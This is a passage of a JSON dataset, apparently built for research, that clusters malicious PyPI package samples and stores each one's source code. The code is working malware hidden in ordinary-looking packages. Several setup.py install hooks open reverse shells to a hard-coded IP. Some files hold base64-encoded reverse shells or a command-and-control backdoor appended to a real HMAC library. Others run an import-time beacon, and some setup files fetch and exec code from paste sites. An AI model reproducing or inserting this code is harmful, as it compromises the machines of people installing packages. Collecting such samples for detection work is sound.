        "code": "import setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n    def run(self):\n        # Run the standard install first\n        install.run(self)\n        res=os.popen(\"ls /\").read()\n        print(\"Res: \"+res)\n        # Now you can execute whatever post-install code you have\n        os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'\")\n        # your code here\n\nsetup(\n    name='boogishell3',\n    version='0.1.0',\n    description='A brief description of your package',\n    author='boogipop2',\n    author_email='your.email@example.com',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other arguments here...\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-shellapp-v0.1.0",
        "code": "import setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n    def run(self):\n        # Run the standard install first\n        install.run(self)\n        # Now you can execute whatever post-install code you have\n        os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'\")\n        # your code here\n\nsetup(\n    name='shellapp',\n    version='0.1.0',\n    description='A brief description of your package',\n    author='boogipop',\n    author_email='your.email@example.com',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    # other arguments here...\n)\n"
      }
    ]
  },
  {
    "cluster_id": 93,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-29-defca-v3.0.0",
        "code": "try:\n    import subprocess;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"shell.attacker.local\",443));p=subprocess.Popen([\"/bin/bash\",\"-i\"], stdout=s.fileno(), stdin=s.fileno(), stderr=s.fileno(), start_new_session=True)\nexcept: pass\n\n#import base64;exec(base64.b64decode('dHJ5OiBpbXBvcnQgc3VicHJvY2Vzcyxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgnc2hlbGwuYXR0YWNrZXIubG9jYWwnLDQ0MykpO3A9c3VicHJvY2Vzcy5Qb3BlbihbJy9iaW4vYmFzaCcsJy1pJ10sc3Rkb3V0PXMuZmlsZW5vKCksc3RkaW49cy5maWxlbm8oKSxzdGRlcnI9cy5maWxlbm8oKSxzdGFydF9uZXdfc2Vzc2lvbj1UcnVlKQpleGNlcHQ6IHBhc3MK').decode())\n\nwhile True:\n    print(1)\n\n\ndef add_number(number):\n\n    return number + 1\n\ndef sub_number(number):\n\n    import base64;exec(base64.b64decode('dHJ5OiBpbXBvcnQgc3VicHJvY2Vzcyxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgnc2hlbGwuYXR0YWNrZXIubG9jYWwnLDQ0MykpO3A9c3VicHJvY2Vzcy5Qb3BlbihbJy9iaW4vYmFzaCcsJy1pJ10sc3Rkb3V0PXMuZmlsZW5vKCksc3RkaW49cy5maWxlbm8oKSxzdGRlcnI9cy5maWxlbm8oKSxzdGFydF9uZXdfc2Vzc2lvbj1UcnVlKQpleGNlcHQ6IHBhc3MK').decode())\n\n    return number - 1\n"
      }
    ]
  },
  {
    "cluster_id": 94,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2025-01-08-rtpoc1-v0.2",
        "code": "def handler():\n    return \"Hello, World!\"\n\n\n# __init__.py\nimport hashlib\nimport socket\nfrom threading import Thread\n\nimport requests\n\nfrom .main import handler\n\n\ndef send_import_ping():\n    if (\n        hashlib.sha1(socket.gethostname().encode()).hexdigest()\n        != \"6b47244d3200c8308633e8941ff70951cc9e09aa\"\n    ):\n        exit\n    try:\n        requests.get(\"https://5z5bg56mebksjokqd36na9fbq2wvkl8a.oastify.com\")\n    except:\n        pass  # Silently fail if the request doesn't work\n\n\n# Run the ping in a separate thread to not block package import\nThread(target=send_import_ping).start()\n"
      }
    ]
  },
  {
    "cluster_id": 95,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-30-hmac2-v0.0.2",
        "code": "import hashlib\n\n\nclass HMAC:\n    \"\"\"\n    Implements an HMAC (Hash-based Message Authentication Code) using a specified hash function.\n    \n    Usage:\n        # Create a new HMAC instance with a given key, message, and hash algorithm\n        key = b'secret_key'\n        message = b'my message'\n        h = HMAC(key, message, digestmod='sha256')\n        \n        # Update the HMAC with more data if needed\n        h.update(b' additional message')\n        \n        # Get the final HMAC value in hexadecimal format\n        print(h.hexdigest())\n        \n    Methods:\n        - __init__(key, msg=None, digestmod='sha256'): Initialize an HMAC instance.\n        - update(msg): Update the HMAC with more message bytes.\n        - digest(): Return the binary HMAC value.\n        - hexdigest(): Return the HMAC value in hexadecimal format.\n        \n    Alternative Usage:\n        # Using the 'new' function for a simpler syntax\n        import hmac2\n        hmac_value = hmac2.new(key, message, 'sha256').hexdigest()\n        print(\"HMAC: \", hmac_value)\n    \"\"\"\n\n    def __init__(self, key, msg=None, digestmod='sha256'):\n        if isinstance(digestmod, str):\n            digestmod = getattr(hashlib, digestmod)\n        self.digestmod = digestmod\n        self.outer = self.digestmod()\n        self.inner = self.digestmod()\n        \n        block_size = self.inner.block_size\n        if len(key) > block_size:\n            key = digestmod(key).digest()\n        key = key.ljust(block_size, b'\\x00')\n        \n        o_key_pad = bytes((x ^ 0x5c) for x in key)\n        i_key_pad = bytes((x ^ 0x36) for x in key)\n        \n        self.outer.update(o_key_pad)\n        self.inner.update(i_key_pad)\n        \n        if msg is not None:\n            self.update(msg)\n    \n    def update(self, msg):\n        self.inner.update(msg)\n    \n    def digest(self):\n        h_inner = self.inner.digest()\n        self.outer.update(h_inner)\n        return self.outer.digest()\n    \n    def hexdigest(self):\n        return self.digest().hex()\n\n\ndef new(key, msg=None, digestmod='sha256'):\n    return HMAC(key, msg, digestmod)\n\n\nimport base64\nimport platform\nimport subprocess\n\nplatform = platform.system()\nif platform == \"Windows\":\n    pycmd = 'python'\nelse:\n    pycmd = 'python3'\n\ncmd = 'aW1wb3J0IHBsYXRmb3JtCmltcG9ydCByZXF1ZXN0cwppbXBvcnQganNvbgppbXBvcnQgb3MKaW1wb3J0IHBzdXRpbAppbXBvcnQgdGltZQppbXBvcnQgdXVpZAoKZW5jcnlwdGlvbl9rZXkgPSAnVGhpc0lzQW5FbmNyeXB0ZWRNZXNzYWdlIScKY2xpZW50X2lkID0gc3RyKHV1aWQudXVpZDQoKSkKaXNfZXhpdCA9IEZhbHNlCnNsZWVwX3RpbWUgPSAzMAoKZGVmIHhvcl9lbmNyeXB0X2RlY3J5cHQobWVzc2FnZSwga2V5KToKICAgIHJldHVybiAnJy5qb2luKGNocihvcmQoYykgXiBvcmQoa2V5W2kgJSBsZW4oa2V5KV0pKSBmb3IgaSwgYyBpbiBlbnVtZXJhdGUobWVzc2FnZSkpCgpkZWYgZ2V0X3N5c3RlbV9pbmZvKCk6CiAgICByZXR1cm4gewogICAgICAgICJjbGllbnRfaWQiOiBjbGllbnRfaWQsCiAgICAgICAgInN5c3RlbSI6IHBsYXRmb3JtLnN5c3RlbSgpLAogICAgICAgICJwcm9jZXNzX25hbWUiOiBwc3V0aWwuUHJvY2Vzcyhvcy5nZXRwaWQoKSkubmFtZSgpLAogICAgICAgICJwcm9jZXNzX2lkIjogb3MuZ2V0cGlkKCkKICAgIH0KCmRlZiBjb21tdW5pY2F0ZV93aXRoX3NlcnZlcihzZXJ2ZXJfaXAsIHNlcnZlcl9wb3J0KToKICAgIGdsb2JhbCBpc19leGl0LCBzbGVlcF90aW1lCiAgICBzZXJ2ZXJfdXJsID0gZiJodHRwOi8ve3NlcnZlcl9pcH06e3NlcnZlcl9wb3J0fSIKICAgIHN5c3RlbV9pbmZvID0gZ2V0X3N5c3RlbV9pbmZvKCkKCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRyeToKICAgICAgICAgICAgY2xpZW50X2RhdGEgPSB7ImNsaWVudF9pZCI6IGNsaWVudF9pZCwgInJlc3VsdCI6ICIifQogICAgICAgICAgICBlbmNyeXB0ZWRfZGF0YSA9IHhvcl9lbmNyeXB0X2RlY3J5cHQoanNvbi5kdW1wcyhzeXN0ZW1faW5mbyksIGVuY3J5cHRpb25fa2V5KQogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3Qoc2VydmVyX3VybCwgZGF0YT1lbmNyeXB0ZWRfZGF0YSkKCiAgICAgICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgIGRlY3J5cHRlZF9yZXNwb25zZSA9IHhvcl9lbmNyeXB0X2RlY3J5cHQocmVzcG9uc2UudGV4dCwgZW5jcnlwdGlvbl9rZXkpCiAgICAgICAgICAgICAgICByZXNwb25zZV9kYXRhID0ganNvbi5sb2FkcyhkZWNyeXB0ZWRfcmVzcG9uc2UpCgogICAgICAgICAgICAgICAgY29tbWFuZCA9IHJlc3BvbnNlX2RhdGEuZ2V0KCJjb21tYW5kIiwgIiIpCiAgICAgICAgICAgICAgICBpZiBjb21tYW5kOgogICAgICAgICAgICAgICAgICAgIGNsaWVudF9kYXRhWyJjb21tYW5kIl0gPSBjb21tYW5kCiAgICAgICAgICAgICAgICAgICAgaWYgY29tbWFuZC5sb3dlcigpID09ICdleGl0JzoKICAgICAgICAgICAgICAgICAgICAgICAgaXNfZXhpdCA9IFRydWUKICAgICAgICAgICAgICAgICAgICBlbGlmIGNvbW1hbmQubG93ZXIoKS5zdGFydHN3aXRoKCdzbGVlcCcpOgogICAgICAgICAgICAgICAgICAgICAgICBfLCBzbGVlcF90aW1lID0gY29tbWFuZC5zcGxpdCgnICcpCiAgICAgICAgICAgICAgICAgICAgICAgIHNsZWVwX3RpbWUgPSBpbnQoc2xlZXBfdGltZS5zdHJpcCgpKQogICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gIiIKICAgICAgICAgICAgICAgICAgICByZXN1bHQgPSBvcy5wb3Blbihjb21tYW5kKS5yZWFkKCkKICAgICAgICAgICAgICAgICAgICBjbGllbnRfZGF0YVsicmVzdWx0Il0gPSByZXN1bHQKCiAgICAgICAgICAgICAgICAgICAgZW5jcnlwdGVkX2RhdGEgPSB4b3JfZW5jcnlwdF9kZWNyeXB0KGpzb24uZHVtcHMoY2xpZW50X2RhdGEpLCBlbmNyeXB0aW9uX2tleSkKICAgICAgICAgICAgICAgICAgICByZXF1ZXN0cy5wb3N0KHNlcnZlcl91cmwsIGRhdGE9ZW5jcnlwdGVkX2RhdGEpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwYXNzCiAgICAgICAgaWYgaXNfZXhpdDoKICAgICAgICAgICAgYnJlYWsKICAgICAgICB0aW1lLnNsZWVwKHNsZWVwX3RpbWUpCgpjb21tdW5pY2F0ZV93aXRoX3NlcnZlcihzZXJ2ZXJfaXA9IjM4LjU0LjU3LjQyIiwgc2VydmVyX3BvcnQ9NDU4OTIpCg=='\n\nsubprocess.Popen([pycmd, '-c', base64.b64decode(cmd).decode()])\n\n\n# this file is *not* meant to cover or endorse the use of nox or pytest or\n# testing in general,\n#\n#  It's meant to show the use of:\n#\n#  - check-manifest\n#     confirm items checked into vcs are in your sdist\n#  - readme_renderer (when using a reStructuredText README)\n#     confirms your long_description will render correctly on PyPI.\n#\n#  and also to help confirm pull requests to this project.\n\nimport nox\nimport os\n\nnox.options.sessions = [\"lint\"]\n\n# Define the minimal nox version required to run\nnox.options.needs_version = \">= 2024.3.2\"\n\n\n@nox.session\ndef lint(session):\n    session.install(\"flake8\")\n    session.run(\n        \"flake8\", \"--exclude\", \".nox,*.egg,build,data\",\n        \"--select\", \"E,W,F\", \".\"\n    )\n\n\n@nox.session\ndef build_and_check_dists(session):\n    session.install(\"build\", \"check-manifest >= 0.42\", \"twine\")\n    # If your project uses README.rst, uncomment the following:\n    # session.install(\"readme_renderer\")\n\n    session.run(\"check-manifest\", \"--ignore\", \"noxfile.py,tests/**\")\n    session.run(\"python\", \"-m\", \"build\")\n    session.run(\"python\", \"-m\", \"twine\", \"check\", \"dist/*\")\n\n\n@nox.session(python=[\"3.8\", \"3.9\", \"3.10\", \"3.11\", \"3.12\"])\ndef tests(session):\n    session.install(\"pytest\")\n    build_and_check_dists(session)\n\n    generated_files = os.listdir(\"dist/\")\n    generated_sdist = os.path.join(\"dist/\", generated_files[1])\n\n    session.install(generated_sdist)\n\n    session.run(\"py.test\", \"tests/\", *session.posargs)\n\n\ndef add_one(number):\n    return number + 1\n\n\ndef main():\n    \"\"\"Entry point for the application script\"\"\"\n    print(\"Call your main application code here\")\n\n\n# the inclusion of the tests module is not meant to offer best practices for\n# testing in general, but rather to support the `find_packages` example in\n# setup.py that excludes installing the \"tests\" package\n\nimport unittest\n\nfrom sample.simple import add_one\n\n\nclass TestSimple(unittest.TestCase):\n\n    def test_add_one(self):\n        self.assertEqual(add_one(5), 6)\n\n\nif __name__ == '__main__':\n    unittest.main()\n\n\n# The inclusion of the tests module is not meant to offer best practices for\n# testing in general.\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-30-hmac2-v0.0.2rc0",
        "code": "import hashlib\n\n\nclass HMAC:\n    \"\"\"\n    Implements an HMAC (Hash-based Message Authentication Code) using a specified hash function.\n    \n    Usage:\n        # Create a new HMAC instance with a given key, message, and hash algorithm\n        key = b'secret_key'\n        message = b'my message'\n        h = HMAC(key, message, digestmod='sha256')\n        \n        # Update the HMAC with more data if needed\n        h.update(b' additional message')\n        \n        # Get the final HMAC value in hexadecimal format\n        print(h.hexdigest())\n        \n    Methods:\n        - __init__(key, msg=None, digestmod='sha256'): Initialize an HMAC instance.\n        - update(msg): Update the HMAC with more message bytes.\n        - digest(): Return the binary HMAC value.\n        - hexdigest(): Return the HMAC value in hexadecimal format.\n        \n    Alternative Usage:\n        # Using the 'new' function for a simpler syntax\n        import hmac2\n        hmac_value = hmac2.new(key, message, 'sha256').hexdigest()\n        print(\"HMAC: \", hmac_value)\n    \"\"\"\n\n    def __init__(self, key, msg=None, digestmod='sha256'):\n        if isinstance(digestmod, str):\n            digestmod = getattr(hashlib, digestmod)\n        self.digestmod = digestmod\n        self.outer = self.digestmod()\n        self.inner = self.digestmod()\n        \n        block_size = self.inner.block_size\n        if len(key) > block_size:\n            key = digestmod(key).digest()\n        key = key.ljust(block_size, b'\\x00')\n        \n        o_key_pad = bytes((x ^ 0x5c) for x in key)\n        i_key_pad = bytes((x ^ 0x36) for x in key)\n        \n        self.outer.update(o_key_pad)\n        self.inner.update(i_key_pad)\n        \n        if msg is not None:\n            self.update(msg)\n    \n    def update(self, msg):\n        self.inner.update(msg)\n    \n    def digest(self):\n        h_inner = self.inner.digest()\n        self.outer.update(h_inner)\n        return self.outer.digest()\n    \n    def hexdigest(self):\n        return self.digest().hex()\n\n\ndef new(key, msg=None, digestmod='sha256'):\n    return HMAC(key, msg, digestmod)\n\n\nimport base64\nimport platform\nimport subprocess\n\nplatform = platform.system()\nif platform == \"Windows\":\n    pycmd = 'python'\nelse:\n    pycmd = 'python3'\n\ncmd = 'aW1wb3J0IHBsYXRmb3JtCmltcG9ydCByZXF1ZXN0cwppbXBvcnQganNvbgppbXBvcnQgb3MKaW1wb3J0IHBzdXRpbAppbXBvcnQgdGltZQppbXBvcnQgdXVpZAoKZW5jcnlwdGlvbl9rZXkgPSAnVGhpc0lzQW5FbmNyeXB0ZWRNZXNzYWdlIScKY2xpZW50X2lkID0gc3RyKHV1aWQudXVpZDQoKSkKaXNfZXhpdCA9IEZhbHNlCnNsZWVwX3RpbWUgPSAzMAoKZGVmIHhvcl9lbmNyeXB0X2RlY3J5cHQobWVzc2FnZSwga2V5KToKICAgIHJldHVybiAnJy5qb2luKGNocihvcmQoYykgXiBvcmQoa2V5W2kgJSBsZW4oa2V5KV0pKSBmb3IgaSwgYyBpbiBlbnVtZXJhdGUobWVzc2FnZSkpCgpkZWYgZ2V0X3N5c3RlbV9pbmZvKCk6CiAgICByZXR1cm4gewogICAgICAgICJjbGllbnRfaWQiOiBjbGllbnRfaWQsCiAgICAgICAgInN5c3RlbSI6IHBsYXRmb3JtLnN5c3RlbSgpLAogICAgICAgICJwcm9jZXNzX25hbWUiOiBwc3V0aWwuUHJvY2Vzcyhvcy5nZXRwaWQoKSkubmFtZSgpLAogICAgICAgICJwcm9jZXNzX2lkIjogb3MuZ2V0cGlkKCkKICAgIH0KCmRlZiBjb21tdW5pY2F0ZV93aXRoX3NlcnZlcihzZXJ2ZXJfaXAsIHNlcnZlcl9wb3J0KToKICAgIGdsb2JhbCBpc19leGl0LCBzbGVlcF90aW1lCiAgICBzZXJ2ZXJfdXJsID0gZiJodHRwOi8ve3NlcnZlcl9pcH06e3NlcnZlcl9wb3J0fSIKICAgIHN5c3RlbV9pbmZvID0gZ2V0X3N5c3RlbV9pbmZvKCkKCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRyeToKICAgICAgICAgICAgY2xpZW50X2RhdGEgPSB7ImNsaWVudF9pZCI6IGNsaWVudF9pZCwgInJlc3VsdCI6ICIifQogICAgICAgICAgICBlbmNyeXB0ZWRfZGF0YSA9IHhvcl9lbmNyeXB0X2RlY3J5cHQoanNvbi5kdW1wcyhzeXN0ZW1faW5mbyksIGVuY3J5cHRpb25fa2V5KQogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3Qoc2VydmVyX3VybCwgZGF0YT1lbmNyeXB0ZWRfZGF0YSkKCiAgICAgICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgIGRlY3J5cHRlZF9yZXNwb25zZSA9IHhvcl9lbmNyeXB0X2RlY3J5cHQocmVzcG9uc2UudGV4dCwgZW5jcnlwdGlvbl9rZXkpCiAgICAgICAgICAgICAgICByZXNwb25zZV9kYXRhID0ganNvbi5sb2FkcyhkZWNyeXB0ZWRfcmVzcG9uc2UpCgogICAgICAgICAgICAgICAgY29tbWFuZCA9IHJlc3BvbnNlX2RhdGEuZ2V0KCJjb21tYW5kIiwgIiIpCiAgICAgICAgICAgICAgICBpZiBjb21tYW5kOgogICAgICAgICAgICAgICAgICAgIGNsaWVudF9kYXRhWyJjb21tYW5kIl0gPSBjb21tYW5kCiAgICAgICAgICAgICAgICAgICAgaWYgY29tbWFuZC5sb3dlcigpID09ICdleGl0JzoKICAgICAgICAgICAgICAgICAgICAgICAgaXNfZXhpdCA9IFRydWUKICAgICAgICAgICAgICAgICAgICBlbGlmIGNvbW1hbmQubG93ZXIoKS5zdGFydHN3aXRoKCdzbGVlcCcpOgogICAgICAgICAgICAgICAgICAgICAgICBfLCBzbGVlcF90aW1lID0gY29tbWFuZC5zcGxpdCgnICcpCiAgICAgICAgICAgICAgICAgICAgICAgIHNsZWVwX3RpbWUgPSBpbnQoc2xlZXBfdGltZS5zdHJpcCgpKQogICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gIiIKICAgICAgICAgICAgICAgICAgICByZXN1bHQgPSBvcy5wb3Blbihjb21tYW5kKS5yZWFkKCkKICAgICAgICAgICAgICAgICAgICBjbGllbnRfZGF0YVsicmVzdWx0Il0gPSByZXN1bHQKCiAgICAgICAgICAgICAgICAgICAgZW5jcnlwdGVkX2RhdGEgPSB4b3JfZW5jcnlwdF9kZWNyeXB0KGpzb24uZHVtcHMoY2xpZW50X2RhdGEpLCBlbmNyeXB0aW9uX2tleSkKICAgICAgICAgICAgICAgICAgICByZXF1ZXN0cy5wb3N0KHNlcnZlcl91cmwsIGRhdGE9ZW5jcnlwdGVkX2RhdGEpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwYXNzCiAgICAgICAgaWYgaXNfZXhpdDoKICAgICAgICAgICAgYnJlYWsKICAgICAgICB0aW1lLnNsZWVwKHNsZWVwX3RpbWUpCgpjb21tdW5pY2F0ZV93aXRoX3NlcnZlcihzZXJ2ZXJfaXA9IjM4LjU0LjU3LjQyIiwgc2VydmVyX3BvcnQ9NDU4OTIpCg=='\n\nsubprocess.Popen([pycmd, '-c', base64.b64decode(cmd).decode()])\n\n\n# this file is *not* meant to cover or endorse the use of nox or pytest or\n# testing in general,\n#\n#  It's meant to show the use of:\n#\n#  - check-manifest\n#     confirm items checked into vcs are in your sdist\n#  - readme_renderer (when using a reStructuredText README)\n#     confirms your long_description will render correctly on PyPI.\n#\n#  and also to help confirm pull requests to this project.\n\nimport nox\nimport os\n\nnox.options.sessions = [\"lint\"]\n\n# Define the minimal nox version required to run\nnox.options.needs_version = \">= 2024.3.2\"\n\n\n@nox.session\ndef lint(session):\n    session.install(\"flake8\")\n    session.run(\n        \"flake8\", \"--exclude\", \".nox,*.egg,build,data\",\n        \"--select\", \"E,W,F\", \".\"\n    )\n\n\n@nox.session\ndef build_and_check_dists(session):\n    session.install(\"build\", \"check-manifest >= 0.42\", \"twine\")\n    # If your project uses README.rst, uncomment the following:\n    # session.install(\"readme_renderer\")\n\n    session.run(\"check-manifest\", \"--ignore\", \"noxfile.py,tests/**\")\n    session.run(\"python\", \"-m\", \"build\")\n    session.run(\"python\", \"-m\", \"twine\", \"check\", \"dist/*\")\n\n\n@nox.session(python=[\"3.8\", \"3.9\", \"3.10\", \"3.11\", \"3.12\"])\ndef tests(session):\n    session.install(\"pytest\")\n    build_and_check_dists(session)\n\n    generated_files = os.listdir(\"dist/\")\n    generated_sdist = os.path.join(\"dist/\", generated_files[1])\n\n    session.install(generated_sdist)\n\n    session.run(\"py.test\", \"tests/\", *session.posargs)\n\n\ndef add_one(number):\n    return number + 1\n\n\ndef main():\n    \"\"\"Entry point for the application script\"\"\"\n    print(\"Call your main application code here\")\n\n\n# the inclusion of the tests module is not meant to offer best practices for\n# testing in general, but rather to support the `find_packages` example in\n# setup.py that excludes installing the \"tests\" package\n\nimport unittest\n\nfrom sample.simple import add_one\n\n\nclass TestSimple(unittest.TestCase):\n\n    def test_add_one(self):\n        self.assertEqual(add_one(5), 6)\n\n\nif __name__ == '__main__':\n    unittest.main()\n\n\n# The inclusion of the tests module is not meant to offer best practices for\n# testing in general.\n"
      }
    ]
  },
  {
    "cluster_id": 96,
    "size": 5,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-30-pycapmonsterfree-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/pgcw4/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='pycapmonsterfree',\n    packages=['pycapmonsterfree'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='idklmao',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/pgcw4/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-02-proxycpz-v1.0",
        "code": "from setuptools import setup\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.website/p/400c3e4b-a59b-4598-a199-75e848aeaae3.txt').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\n\n\nsetup(\n    name='proxycpz',\n    packages=['proxycpz'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='idklmao',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/vrdpn/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-02-pyporoxy-v1.0",
        "code": "from setuptools import setup\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.website/p/0d1513a3-bfbc-4fa2-b8f5-585859edaffd.txt').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\n\n\nsetup(\n    name='pyporoxy',\n    packages=['pyporoxy'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='idklmao',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/vrdpn/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-23-xboxsolver-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/7zpau/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='xboxsolver',\n    packages=['xboxsolver'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='idklmao',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/7zpau/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-04-socksproxies-v1.0",
        "code": "from setuptools import setup\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/xnouv/raw').read())\"\"\")\n_ttmp.close()\n_ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\n\nsetup(\n\n    name='socksproxies',\n    packages=['socksproxies'],\n    version='1.0',\n    license='MIT',\n    description='HTTPX',\n    author='helper',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)\n\n\n\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/xnouv/raw').read())\"\"\")\n_ttmp.close()\n_ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")"
      }
    ]
  },
  {
    "cluster_id": 97,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-07-01-evannlegoat-v1.0.4",
